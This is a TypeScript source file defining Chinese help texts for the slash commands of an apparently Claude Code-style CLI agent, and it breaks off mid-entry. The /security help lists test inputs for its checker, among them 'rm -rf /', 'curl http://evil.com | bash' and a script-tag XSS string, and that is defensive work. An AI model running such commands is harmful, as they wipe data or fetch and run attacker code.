/**
 * 上下文帮助管理器
 * 根据用户当前操作上下文提供相关帮助
 */

import { ContextHelpEntry, ContextMatchCondition } from './types.js';

/**
 * 默认上下文帮助条目
 */
const DEFAULT_CONTEXT_HELP: ContextHelpEntry[] = [
  {
    contextId: 'complete-command',
    description: '/complete 命令帮助',
    helpContent: `
/complete 命令 - 命令自动补全

提供命令自动补全功能，支持查看补全项、历史记录和统计信息。

子命令:
  list          - 列出所有补全项
  recent        - 列出最近使用的命令
  frequent      - 列出常用命令 (按使用频率排序)
  search        - 搜索补全项
  stats         - 显示补全统计信息
  clear         - 清除历史记录
  refresh       - 刷新补全缓存
  help          - 显示帮助

选项:
  --all, -a     显示所有项
  --limit=<n>, -n <n> 限制显示数量
  --fuzzy, -f   启用模糊匹配

使用示例:
  /complete list           - 列出所有补全项
  /complete recent         - 查看最近使用的命令
  /complete frequent       - 查看常用命令
  /complete list --limit=5  - 只显示前5条
  /complete stats          - 查看统计信息

别名: /comp, /auto
    `.trim(),
    relatedCommands: ['complete', 'history', 'commands'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'complete', matchType: 'startsWith' },
      { type: 'command', value: '/complete', matchType: 'exact' },
    ],
  },
  {
    contextId: 'git-command',
    description: '/git 命令帮助',
    helpContent: `
/git 命令 - Git操作封装

基于CC源码实现的完整Git操作命令。

子命令:
  status      - 显示工作区状态
  branch      - 显示/管理分支
  log         - 显示提交历史
  diff        - 显示文件差异
  stash       - 管理stash
  remote      - 管理远程仓库
  worktree    - 管理工作树
  submodule   - 管理子模块
  tag         - 管理标签
  info        - 显示仓库信息
  shortcut    - 显示快捷方式

选项:
  --short, -s    简洁输出
  --verbose, -v  详细输出
  --stat         显示统计信息
  --file=<文件>  指定文件

使用示例:
  /git status           - 查看工作区状态
  /git status --short   - 简洁模式
  /git branch           - 查看所有分支
  /git log -n 20       - 查看最近20条提交
  /git diff --cached   - 查看暂存区差异
  /git log --file=src/index.ts  - 查看文件历史
  /git info             - 显示仓库信息
  /git shortcut        - 显示快捷方式

快捷方式:
  /git s  = /git status
  /git b  = /git branch
  /git l  = /git log
  /git d  = /git diff

别名: /git-cmd
    `.trim(),
    relatedCommands: ['git', 'commit', 'diff', 'branch', 'stash'],
    relatedTools: ['BashTool'],
    matchConditions: [
      { type: 'command', value: 'git', matchType: 'startsWith' },
      { type: 'command', value: '/git', matchType: 'exact' },
    ],
  },
  {
    contextId: 'file-operation',
    description: '文件操作帮助',
    helpContent: `
文件操作帮助:
- 使用 "read <filepath>" 读取文件内容
- 使用 "write <filepath>" 写入文件
- 使用 "edit <filepath>" 编辑文件
- 使用 "glob <pattern>" 搜索文件
    `.trim(),
    relatedCommands: ['read', 'write', 'edit', 'glob'],
    relatedTools: ['FileReadTool', 'FileWriteTool', 'FileEditTool', 'GlobTool'],
    matchConditions: [
      { type: 'command', value: 'read', matchType: 'startsWith' },
      { type: 'command', value: 'write', matchType: 'startsWith' },
      { type: 'command', value: 'edit', matchType: 'startsWith' },
      { type: 'tool', value: 'FileReadTool', matchType: 'exact' },
    ],
  },
  {
    contextId: 'git-operation',
    description: 'Git 操作帮助',
    helpContent: `
Git 操作帮助:
- 使用 "/diff" 查看暂存区差异
- 使用 "/commit <message>" 提交更改（需要先使用 git add 暂存文件）
- 使用 "git status" 查看工作区状态
- 使用 "git add <file>" 暂存文件
- 使用 "git log" 查看提交历史

/commit 命令用法:
  /commit --status           - 显示详细的Git状态
  /commit "fix: 修复bug"    - 使用指定消息提交
  /commit --all "feat: 新功能" - 暂存所有变更并提交
  /commit --dry-run "test"  - 预览提交（不实际执行）

选项:
  --status     - 显示详细的Git状态
  --all        - 暂存所有已跟踪文件的变更
  --dry-run    - 预览提交（不实际执行）
  --no-verify  - 跳过pre-commit hooks（不推荐）
  --amend      - 修改最后一次提交（不推荐）

注意: 执行提交前请确保已使用 git add 暂存需要提交的文件。
    `.trim(),
    relatedCommands: ['git', 'commit', 'diff', 'log', 'branch'],
    relatedTools: ['BashTool'],
    matchConditions: [
      { type: 'command', value: 'git', matchType: 'startsWith' },
      { type: 'command', value: 'commit', matchType: 'contains' },
      { type: 'command', value: 'diff', matchType: 'contains' },
    ],
  },
  {
    contextId: 'code-analysis',
    description: '代码分析帮助',
    helpContent: `
代码分析帮助:
- 使用 "explain <filepath>" 解释代码
- 使用 "analyze <filepath>" 分析代码
- 使用 "review <filepath>" 审查代码
    `.trim(),
    relatedCommands: ['explain', 'analyze', 'review'],
    relatedTools: ['FileReadTool'],
    matchConditions: [
      { type: 'command', value: 'explain', matchType: 'startsWith' },
      { type: 'command', value: 'analyze', matchType: 'startsWith' },
      { type: 'command', value: 'review', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'debug-command',
    description: 'Debug命令帮助',
    helpContent: `
Debug 命令帮助:

使用 "/debug" 命令获取系统调试信息，所有数据均来自真实系统调用。

用法:
  /debug                    - 显示系统状态（默认）
  /debug status             - 显示系统状态
  /debug inspect            - 显示进程详细信息
  /debug --json             - 以 JSON 格式输出
  /debug help               - 显示此帮助信息

输出内容:
  系统状态 - 平台、架构、CPU、内存占用率、运行时间、负载
  进程信息 - PID、Node版本、内存详细（RSS/堆/外部）、CPU时间

示例:
  /debug
  /debug status
  /debug inspect --json

别名: /dev, /developer
    `.trim(),
    relatedCommands: ['debug', 'dev', 'developer'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: '/debug', matchType: 'startsWith' },
      { type: 'command', value: '/dev', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'subagent',
    description: 'SubAgent管理帮助',
    helpContent: `
SubAgent 命令帮助:

使用 "/subagent" 命令管理子代理（Agent）定义，支持从不同来源加载
.md 配置文件。

用法:
  /subagent                    - 列出所有活跃 Agent
  /subagent list               - 列出所有活跃 Agent（按来源分组）
  /subagent info <名称>         - 查看 Agent 详情
  /subagent create <名称> <描述> - 创建新 Agent
  /subagent delete <名称>       - 删除已创建的 Agent
  /subagent --json             - 以 JSON 格式输出 Agent 列表
  /subagent help               - 显示此帮助信息

输出内容:
  Agent 列表 - 按来源分组（内置 / 用户 / 项目），显示优先级去重后的活跃 Agent
  Agent 详情 - 名称、来源、描述、工具、模型、记忆、文件路径

支持来源:
  - 内置 Agent（不可删除）
  - 用户配置（~/.claude/agents/）
  - 项目配置（.claude/agents/）

数据格式:
  Agent 定义为 Markdown 文件，包含 YAML frontmatter：
  ---
  name: my-agent
  description: 我的自定义助手
  tools: file_read,file_write,grep
  model: claude-sonnet-4
  ---

相关命令:
  /subagent-run    - 执行子代理任务
  /agent-instance  - 管理 Agent 实例

示例:
  /subagent
  /subagent list
  /subagent info general-purpose
  /subagent create my-agent "我的自定义助手" --tools "file_read,grep"
  /subagent delete my-agent

别名: /agent, /agents
    `.trim(),
    relatedCommands: ['subagent', 'agent', 'agents', 'subagent-run', 'agent-instance'],
    relatedTools: ['AgentTool'],
    matchConditions: [
      { type: 'command', value: 'subagent', matchType: 'startsWith' },
      { type: 'command', value: 'agent', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'bridge',
    description: 'Bridge远程控制帮助',
    helpContent: `
Bridge 命令帮助:

使用 "/bridge" 命令管理远程控制桥接连接。

用法:
  /bridge                     - 查看连接状态和可用子命令（默认）
  /bridge status              - 查看 Bridge 连接状态
  /bridge config              - 查看 Bridge 配置详情
  /bridge start               - 启动 Bridge 服务（远程模式）
  /bridge start --local       - 启动 Bridge（模拟模式，无需网络）
  /bridge stop                - 停止 Bridge 服务
  /bridge connect [id]        - 连接到远程控制（可选指定会话 ID）
  /bridge --json              - 以 JSON 格式输出状态信息
  /bridge help                - 显示此帮助信息

输出内容:
  status - 桥接状态/连接信息/轮询统计/会话统计/心跳统计/活跃会话列表
  config - Bridge ID/机器名称/工作目录/API 配置等

功能开关:
  需启用 BRIDGE_MODE 功能开关方可使用 start/connect。

相关命令:
  /session    - 会话管理
  /remoteIO   - 远程输入输出

示例:
  /bridge status
  /bridge status --json
  /bridge config
  /bridge start
  /bridge start --local
  /bridge stop
  /bridge connect session-123

别名: /rc, /remote-control
    `.trim(),
    relatedCommands: ['bridge', 'rc', 'remote-control'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'bridge', matchType: 'startsWith' },
      { type: 'command', value: 'rc', matchType: 'exact' },
    ],
  },
  {
    contextId: 'ide',
    description: 'IDE集成帮助',
    helpContent: `
IDE 命令帮助:

使用 "/ide" 命令检测系统上已安装的 IDE，并在当前 IDE 中打开项目目录。

用法:
  /ide                    - 列出所有已安装的 IDE 及其状态
  /ide open               - 在当前 IDE 中打开项目目录
  /ide --json             - 以 JSON 格式输出 IDE 检测结果
  /ide help               - 显示此帮助

输出内容:
  状态列表 - 8 个 IDE 的安装状态和路径
  JSON 输出 - total / installed / ides 结构化数据

支持的 IDE:
  VS Code (code / vscode), Cursor, Trae, Windsurf,
  Zed, IntelliJ IDEA, PyCharm, WebStorm

检测方式（按优先级）:
  1. 开始菜单扫描 — 扫描 Windows 开始菜单中的快捷方式
  2. PATH 环境变量 — 通过 where 命令查找
  3. 常见安装路径 — 逐一检查可能的安装目录

示例:
  /ide
  /ide open
  /ide --json

别名: /editor
    `.trim(),
    relatedCommands: ['ide', 'editor'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'ide', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'error-handling',
    description: '错误处理帮助',
    helpContent: `
错误处理帮助:
- 使用 "debug this error" 调试错误
- 使用 "fix this" 修复问题
- 使用 "explain error" 解释错误
    `.trim(),
    relatedCommands: ['debug', 'fix', 'explain'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'debug', matchType: 'startsWith' },
      { type: 'command', value: 'fix', matchType: 'startsWith' },
      { type: 'error', value: 'Error', matchType: 'contains' },
    ],
  },
  {
    contextId: 'testing',
    description: '测试帮助',
    helpContent: `
测试帮助:
- 使用 "write test for <filepath>" 编写测试
- 使用 "run tests" 运行测试
- 使用 "check coverage" 检查覆盖率
    `.trim(),
    relatedCommands: ['test', 'run tests', 'coverage'],
    relatedTools: ['BashTool'],
    matchConditions: [
      { type: 'command', value: 'test', matchType: 'contains' },
      { type: 'command', value: 'coverage', matchType: 'contains' },
    ],
  },
  {
    contextId: 'command-completion',
    description: '命令补全帮助',
    helpContent: `
命令补全帮助:
- 使用 "/complete list <input>" 列出命令补全项
- 使用 "/complete recent" 列出最近使用的命令
- 使用 "/complete frequent" 列出常用命令

/complete 命令用法:
  /complete list /vi      - 列出以 /vi 开头的命令
  /complete recent        - 显示最近使用的命令历史
  /complete frequent      - 显示常用命令统计

别名: /comp, /auto
    `.trim(),
    relatedCommands: ['complete', 'comp', 'auto', 'help'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'complete', matchType: 'startsWith' },
      { type: 'command', value: 'comp', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'parallel-execution',
    description: '并行执行帮助',
    helpContent: `
并行执行帮助:
- 使用 "/parallel" 命令可以同时执行多个工具操作
- 任务之间使用分号 ";" 分隔
- 每个任务格式: <工具名> <输入>
- 输入支持普通字符串和 JSON 格式

选项:
  -h, --help              显示帮助信息
  -c, --concurrency <N>   最大并发数（默认: 4，最大: 10）
  -t, --timeout <ms>      每个任务的超时时间（毫秒）
  -p, --progress          显示实时进度
      --compact           紧凑输出模式

/parallel 命令用法:
  /parallel bash "echo hello" ; bash "echo world"
  /parallel read "file1.txt" ; read "file2.txt"
  /parallel -c 2 bash "echo 1" ; bash "echo 2" ; bash "echo 3"
  /parallel -t 30000 bash "npm install" ; bash "pip install"
  /parallel --compact bash "ls" ; read "file.txt"
  /parallel -p bash '{"command":"ls -la"}' ; bash '{"command":"pwd"}'

别名: /async, /multi

注意: 默认最大并发数为4（可配置），超时后任务将被终止。
    `.trim(),
    relatedCommands: ['parallel', 'async', 'multi'],
    relatedTools: ['BashTool', 'FileReadTool'],
    matchConditions: [
      { type: 'command', value: 'parallel', matchType: 'startsWith' },
      { type: 'command', value: 'async', matchType: 'startsWith' },
      { type: 'command', value: 'multi', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'permission-management',
    description: '权限管理帮助',
    helpContent: `
权限管理帮助:

/permissions - 权限管理（别名: /perm, /auth, /permission）
  融合快速权限操作、权限模式切换（信任光谱）、会话规则管理与细粒度权限控制

快速操作:
  /permissions list                        - 列出所有权限
  /permissions show <权限名>               - 查看权限详情
  /permissions grant <权限名>              - 授予权限
  /permissions revoke <权限名>             - 撤销权限
  /permissions status                      - 显示权限状态
  /permissions status --json               - 以JSON格式显示权限状态

权限模式管理（信任光谱）:
  /permissions mode                        - 显示当前权限模式
  /permissions mode show                   - 显示当前权限模式
  /permissions mode set <模式>             - 切换权限模式

可用模式:
  plan         - 计划模式：拒绝所有执行操作，仅允许只读操作
  default      - 默认模式：AI先评估风险，危险操作主动询问用户
  acceptEdits  - 接受编辑：自动允许编辑器类工具的写入操作
  bypass       - 绕过模式：跳过所有权限检查（谨慎使用）

会话规则管理:
  /permissions rules                       - 查看当前会话的权限规则
  /permissions rules --json                - 以JSON格式查看

细粒度控制:
  /permissions add <动作> <类型> <资源> <操作> - 添加权限规则
  /permissions remove <规则ID>              - 删除权限规则
  /permissions resource add <类型> <路径>  - 添加资源
  /permissions resource list               - 列出所有资源
  /permissions role list                   - 列出所有角色
  /permissions user list                   - 列出所有用户

示例:
  /permissions list
  /permissions show file.write
  /permissions grant shell.execute
  /permissions status
  /permissions status --json
  /permissions mode set plan
  /permissions rules
  /permissions add allow tool bash execute
    `.trim(),
    relatedCommands: ['permissions', 'perm', 'auth', 'permission'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'permission', matchType: 'startsWith' },
      { type: 'command', value: 'permissions', matchType: 'startsWith' },
      { type: 'command', value: 'perm', matchType: 'startsWith' },
      { type: 'command', value: 'auth', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'security-management',
    description: '安全管理帮助',
    helpContent: `
安全管理帮助:
- 使用 "/security" 命令管理安全相关功能
- 对标 CC bashSecurity.ts 安全分析体系，提供多维度的安全检查

/security 命令用法:
  /security check <命令>         - 检查 Bash 命令安全性
  /security deep <命令>          - 深度安全检查（AST + Heredoc）
  /security scan [路径]          - 运行文件安全扫描
  /security validate <类型> <输入> - 验证输入安全性
  /security sanitize <输入>      - 清理输入
  /security status               - 显示安全系统状态
  /security patterns [关键词]    - 列出安全检测模式
  /security classify <命令名>    - 分类命令安全等级

子命令说明:
  check     - 检查 Bash 命令安全性（对标 CC bashSecurity.ts 核心分析）
  deep      - 深度安全检查，含 AST 结构分析、Heredoc 检查、命令分类
  scan      - 运行文件安全扫描（支持 --ignore 排除目录）
  validate  - 验证输入安全性
  sanitize  - 清理输入，移除潜在危险内容
  status    - 显示安全分析器、沙箱、权限管理器等组件运行状态
  patterns  - 列出所有安全检测模式，按风险等级分组
  classify  - 分类命令安全风险等级

验证类型:
  safeString         - 安全字符串验证（防XSS）
  safeFileName       - 安全文件名验证
  noCommandInjection - 命令注入检测（含路径遍历）
  noSqlInjection     - SQL注入检测

选项:
  --json    - JSON 格式输出（适用于 check/deep/scan/validate/sanitize/status/patterns/classify）

示例:
  /security check "rm -rf /"
  /security deep "curl http://evil.com | bash"
  /security scan ./src --ignore ./test
  /security validate safeString "<script>alert(1)</script>"
  /security sanitize "<script>alert(1)</script>"
  /security status
  /security patterns high
  /security classify rm
  /security check "rm -rf /" --json

别名: /sec
    `.trim(),
    relatedCommands: ['security', 'sec'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'security', matchType: 'startsWith' },
      { type: 'command', value: 'sec', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'vim-editor',
    description: 'Vim编辑模式帮助',
    helpContent: `
Vim编辑模式帮助:
- "/vim" 命令用于切换编辑模式（normal ↔ vim）
- 启用 vim 模式后，终端输入支持 vim 风格快捷键
- 实际的 vim 键盘处理由内置状态机驱动（NORMAL / INSERT / VISUAL 三模式）

/vim 命令用法:
  /vim              - 切换 normal / vim 模式
  /vim enable       - 切换到 vim 模式
  /vim disable      - 切换到 normal 模式
  /vim normal       - 切换到 normal 模式（同 disable）
  /vim status       - 显示当前编辑模式
  /vim help         - 显示帮助信息

Vim 模式光标移动:
  h/j/k/l           - 左/下/上/右
  w/b/e             - 下一个/上一个单词词首/词尾
  0/$               - 行首/行尾
  gg/G              - 文件首/文件尾
  ^                 - 行首第一个非空白字符
  %                 - 匹配括号跳转

Vim 模式编辑操作:
  i                 - 进入 INSERT 模式
  Escape            - 返回 NORMAL 模式
  v                 - 进入 VISUAL 模式（可视选择）
  d                 - 删除（配合 motion: dw, dd, d$）
  c                 - 修改（配合 motion: cw, cc, c$）
  y                 - 复制/抽像（配合 motion: yw, yy）
  r                 - 替换单个字符
  p                 - 粘贴
  u                 - 撤销
  .                 - 重复上次操作
  x                 - 删除光标处字符

文本对象（配合 d/c/y）:
  iw                - 单词内（inner word）
  ip                - 段落内（inner paragraph）
  i" / i'           - 引号内
  i( / i[ / i{      - 括号内

示例:
  /vim              - 切换编辑模式
  /vim enable       - 开启 vim 模式
  /vim disable      - 关闭 vim 模式
  /vim status       - 查看当前模式

别名: /vi
    `.trim(),
    relatedCommands: ['vim', 'vi'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'vim', matchType: 'startsWith' },
      { type: 'command', value: 'vi', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'voice-mode',
    description: '语音模式帮助',
    helpContent: `
语音模式帮助:
- 使用 "/voice" 命令切换语音模式开关
- 启用后可通过快捷键进行语音输入
- 集成语音输入与语音输出功能

/voice 命令用法:
  /voice              - 切换语音模式开关（开⇄关）
  /voice enable       - 启用语音模式
  /voice disable      - 禁用语音模式
  /voice status       - 显示语音模式状态（录音工具、启用状态）
  /voice help         - 显示本帮助

子命令别名:
  enable  同义词: on
  disable 同义词: off

功能说明:
  语音输入         - 按住快捷键开始录音，松开后自动识别
  语音输出         - 自动朗读回复内容
  语音命令         - 支持语音唤醒和语音指令

系统要求:
  - Windows:  使用 PowerShell 录音（无需额外工具）
  - macOS:    需要安装 SoX（brew install sox）
  - Linux:    需要安装 SoX 或 ALSA arecord

快捷键:
  默认按 Space 键    - 开始/停止录音（按住说话，松开识别）

示例:
  /voice             - 切换开关
  /voice enable      - 启用语音模式
  /voice disable     - 禁用语音模式
  /voice status      - 查看状态

别名: /voice-mode, /语音
    `.trim(),
    relatedCommands: ['voice', 'voice-mode', '语音'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'voice', matchType: 'startsWith' },
      { type: 'command', value: '语音', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'export-conversation',
    description: '导出对话帮助',
    helpContent: `
导出对话帮助:
- 使用 "/export" 命令导出对话记录到文件
- 支持智能文件名（自动从首条消息提取关键词）
- 支持 JSON 格式导出

/export 命令用法:
  /export                    - 导出对话（智能文件名）
  /export <文件名>          - 导出对话到指定文件
  /export status            - 显示导出状态信息
  /export --json            - 以 JSON 格式导出对话
  /export help              - 显示本帮助

文件名规则:
  - 不提供文件名时，自动从首条消息提取关键词生成文件名
  - 若首条消息为空，使用 conversation-时间戳.txt
  - 提供文件名但无 .txt 扩展名，自动添加
  - 文件保存在当前工作目录下

导出格式:
  纯文本格式:
  - 包含导出时间和分隔线
  - 用户消息标记为 [用户]
  - 助手消息标记为 [Claude]
  - 支持 tool_use / tool_result / thinking 内容块

  JSON 格式:
  - 结构化数据，含 app、exportTime、messages 字段
  - 每条消息含 role / content / timestamp

示例:
  /export
  /export my-conversation
  /export chat-log.txt
  /export status
  /export --json

别名: /导出
    `.trim(),
    relatedCommands: ['export', '导出'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'export', matchType: 'startsWith' },
      { type: 'command', value: '导出', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'share-conversation',
    description: '分享对话帮助',
    helpContent: `
分享对话帮助:
- 使用 "/share" 命令将当前对话分享为 Markdown 文件
- 支持自定义文件名和 JSON 格式导出

/share 命令用法:
  /share                    - 分享对话（自动文件名）
  /share <文件名>          - 分享到指定文件
  /share status            - 显示分享状态
  /share --json            - 同时生成 Markdown + JSON 双文件
  /share help              - 显示本帮助

文件名规则:
  - 不提供文件名时，使用 share-时间戳.md
  - 提供文件名但无 .md 扩展名，自动添加
  - 文件保存在当前工作目录下

输出格式:
  Markdown 格式:
  - # PY_APP 对话分享（一级标题）
  - > 分享时间（引用块）
  - ## 用户 / ## Claude（二级标题）
  - 支持 text / tool_use / tool_result / thinking 内容块

  JSON 格式（--json）:
  - 结构化数据，含 app / shareTime / messageCount / messages
  - 每条消息含 role / content / timestamp

示例:
  /share
  /share my-chat
  /share discussion.md
  /share status
  /share --json

别名: /分享
    `.trim(),
    relatedCommands: ['share', '分享'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'share', matchType: 'startsWith' },
      { type: 'command', value: '分享', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'statistics',
    description: '统计信息帮助',
    helpContent: `
统计信息帮助:
- 使用 "/stats" 命令查看工作统计信息
- 支持多种统计类型：综合、代码、任务、时间

/stats 命令用法:
  /stats summary   - 显示综合统计
  /stats code      - 显示代码统计
  /stats tasks     - 显示任务统计
  /stats time      - 显示时间统计
  /stats help      - 显示帮助信息

子命令说明:
  summary   - 显示综合统计（今日、本周、总计）
  code      - 显示代码统计（语言分布）
  tasks     - 显示任务统计（完成情况）
  time      - 显示时间统计（工作时长）

示例:
  /stats summary
  /stats code
  /stats tasks
  /stats time

别名: /statistics, /统计
    `.trim(),
    relatedCommands: ['stats', 'statistics', '统计'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'stats', matchType: 'startsWith' },
      { type: 'command', value: 'statistics', matchType: 'startsWith' },
      { type: 'command', value: '统计', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'cost-management',
    description: '成本统计帮助',
    helpContent: `
成本统计帮助:
- 使用 "/cost" 命令查看 API 调用成本和使用统计
- 支持多种统计视图：总览、明细、使用情况、时间范围
- 支持快速状态概览和 JSON 格式输出

/cost 命令用法:
  /cost                   - 显示成本总览
  /cost --breakdown (-b)  - 显示各模型成本明细
  /cost --usage (-u)      - 显示调用使用统计
  /cost --time (-t)       - 显示时间范围统计
  /cost status            - 显示快速成本状态
  /cost --json            - 以 JSON 格式输出
  /cost help              - 显示帮助

总览信息包含:
  - 总花费与总调用次数
  - 平均每次调用成本
  - 成功/失败调用统计
  - 当前会话成本

示例:
  /cost
  /cost -b
  /cost --usage
  /cost status
  /cost --json

别名: /costs, /usage-cost
    `.trim(),
    relatedCommands: ['cost', 'costs', 'usage-cost'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'cost', matchType: 'startsWith' },
      { type: 'command', value: 'costs', matchType: 'startsWith' },
      { type: 'command', value: 'usage-cost', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'token-stats',
    description: 'Token统计帮助',
    helpContent: `
Token 使用统计帮助:

使用 "/tokens" 命令查看基于真实数据的 Token 使用统计，数据来源包括
CostAnalyticsTracker（会话级）和 CostPersistenceService（跨会话持久化）。

用法:
  /tokens                        - 显示 Token 使用统计
  /tokens --breakdown (-b)       - 显示各模型 Token 使用明细
  /tokens --json                 - 以 JSON 格式输出结构化数据
  /tokens --reset                - 重置 Token 统计
  /tokens help                   - 显示此帮助信息

输出内容:
  - 总用量（累积 + 会话）
  - 当前会话用量
  - 历史累计用量
  - 缓存Token用量
  - 请求统计

示例:
  /tokens
  /tokens --breakdown
  /tokens --json
  /tokens --reset

别名: /token-stats
    `.trim(),
    relatedCommands: ['tokens', 'token-stats'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'tokens', matchType: 'startsWith' },
      { type: 'command', value: 'token-stats', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'environment-vars',
    description: '环境变量帮助',
    helpContent: `
环境变量命令帮助:

使用 "/env" 命令查看应用环境配置和系统信息。

用法:
  /env                      - 显示应用环境配置
  /env --all (-a)           - 显示全部环境变量
  /env --json               - 以 JSON 格式输出
  /env help                 - 显示此帮助信息

输出内容:
  - 按前缀筛选的应用配置项（默认模式）
  - 全部环境变量（--all 模式）
  - 系统信息（平台/架构/Node版本/终端类型）
  - 敏感值自动隐藏（KEY/SECRET/TOKEN/PASSWORD）

示例:
  /env
  /env --all
  /env --json

别名: /environment
    `.trim(),
    relatedCommands: ['env', 'environment'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'env', matchType: 'startsWith' },
      { type: 'command', value: 'environment', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'usage-stats',
    description: '用量统计帮助',
    helpContent: `
用量统计命令帮助:

使用 "/usage" 命令查看基于真实数据的用量统计，数据来源包括 UsageTracker
(token/API/成本) 和系统监控(内存/运行时间)。

子命令:
  /usage                           - 显示总体用量统计(Token/API/工具/成本)
  /usage --trends (-t)             - 显示趋势分析(调用频率/缓存命中)
  /usage --commands (-c)           - 显示命令使用统计(注册命令数/分类)
  /usage --tools (-o)              - 显示工具使用统计(调用次数/工具类型)
  /usage --behavior (-b)           - 显示用户行为分析(使用模式/成本效率)
  /usage --performance (-p)        - 显示性能指标(内存/运行时间/调用频率)
  /usage status                    - 显示快速用量状态概览
  /usage --json                    - 以 JSON 格式输出结构化数据
  /usage help                      - 显示此帮助信息

总体统计包含:
  - Token 用量（总/输入/输出/缓存读取/缓存创建）
  - API 调用与工具调用次数
  - 总成本与会话运行时
  - 已注册命令数

示例:
  /usage
  /usage --trends
  /usage --commands
  /usage status
  /usage --json

别名: /statistics, /usage-stats
    `.trim(),
    relatedCommands: ['usage', 'statistics', 'usage-stats'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'usage', matchType: 'startsWith' },
      { type: 'command', value: 'statistics', matchType: 'startsWith' },
      { type: 'command', value: 'usage-stats', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'doctor',
    description: '系统诊断帮助',
    helpContent: `
系统诊断帮助:

使用 "/doctor" 命令对系统进行健康检查和问题诊断。
数据来源包括 DoctorCheck.ts 的真实系统数据（Node.js/内存/运行时间）
与系统诊断框架（网络/配置/安全/性能）。

子命令:
  /doctor                        - 执行完整系统诊断（含概览 + 详细结果 + 建议）
  /doctor --quick (-q)           - 快速诊断（仅关键系统/网络/配置检查）
  /doctor --detailed (-d)        - 详细诊断（含高级指标、集成点、资源使用）
  /doctor --fix (-f)             - 诊断并列出可修复的问题
  /doctor status                 - 快速健康状态概览
  /doctor --json                 - 以 JSON 格式输出结构化诊断结果
  /doctor help                   - 显示此帮助信息

诊断检查项目:
  - 系统基础检查（Node.js、平台、工作目录、堆内存、运行时间）
  - 网络连接检查（网络连通性、API 密钥配置）
  - 文件系统检查（配置文件、数据库文件、日志文件）
  - 配置检查（数据库配置、安全配置、性能配置）
  - 性能检查（响应时间、内存使用、缓存效率）
  - 安全性检查（权限配置、敏感信息检测、更新状态）
  - 高级指标检查（仅 --detailed）
  - 集成点检查（仅 --detailed）
  - 资源使用检查（仅 --detailed）

示例:
  /doctor
  /doctor --quick
  /doctor --detailed
  /doctor status
  /doctor --json

别名: /diagnose, /health-check
    `.trim(),
    relatedCommands: ['doctor', 'diagnose', 'health-check'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'doctor', matchType: 'startsWith' },
      { type: 'command', value: 'diagnose', matchType: 'startsWith' },
      { type: 'command', value: 'health-check', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'fast',
    description: '快速模式帮助',
    helpContent: `
快速模式帮助:

使用 "/fast" 命令切换 AI 模型的快速模式。
快速模式启用后使用专门优化的模型提供更快的响应速度，降低交互延迟。

子命令:
  /fast                  - 切换快速模式开关
  /fast on (enable)      - 启用快速模式
  /fast off (disable)    - 禁用快速模式
  /fast status           - 显示快速模式当前状态
  /fast --json           - 以 JSON 格式输出状态
  /fast help             - 显示本帮助

功能说明:
  - 状态持久化：快速模式状态自动保存，重启后保持
  - 实时查看：使用 /fast status 查看当前状态

示例:
  /fast
  /fast on
  /fast status
  /fast --json

别名: /fast-mode
    `.trim(),
    relatedCommands: ['fast', 'fast-mode'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'fast', matchType: 'startsWith' },
      { type: 'command', value: 'fast-mode', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'skills',
    description: '技能管理帮助',
    helpContent: `
技能管理帮助:
- 使用 "/skill" 命令管理和查看可用的技能
- 技能是可复用的功能模块，如 debug、verify、remember 等

/skill 命令用法:
  /skill              - 显示技能概览
  /skill list         - 列出所有技能（详细信息）
  /skill info <技能名>  - 查看技能详情
  /skill enable <技能名> - 启用技能
  /skill disable <技能名> - 禁用技能
  /skill reload        - 重新加载所有技能

功能说明:
  技能概览     - 显示所有已加载的技能及其状态
  详细列表     - 显示每个技能的完整信息（名称、描述、来源等）
  技能详情     - 显示指定技能的详细信息
  启用/禁用    - 管理技能的启用状态
  重新加载     - 重新加载所有技能（用于开发调试）

示例:
  /skill
  /skill list
  /skill info debug
  /skill enable simplify
  /skill disable stuck
  /skill reload

别名: /sk, /skills
    `.trim(),
    relatedCommands: ['skill', 'skills', 'sk', '技能'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'skills', matchType: 'startsWith' },
      { type: 'command', value: 'skill', matchType: 'startsWith' },
      { type: 'command', value: '技能', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'memory',
    description: '记忆文件管理帮助',
    helpContent: `
记忆文件管理帮助:
- 使用 "/memory" 命令管理 PY_APP 记忆文件
- 支持创建、查看、编辑、删除、状态查询和 JSON 输出

/memory 命令用法:
  /memory                    - 显示记忆文件概览
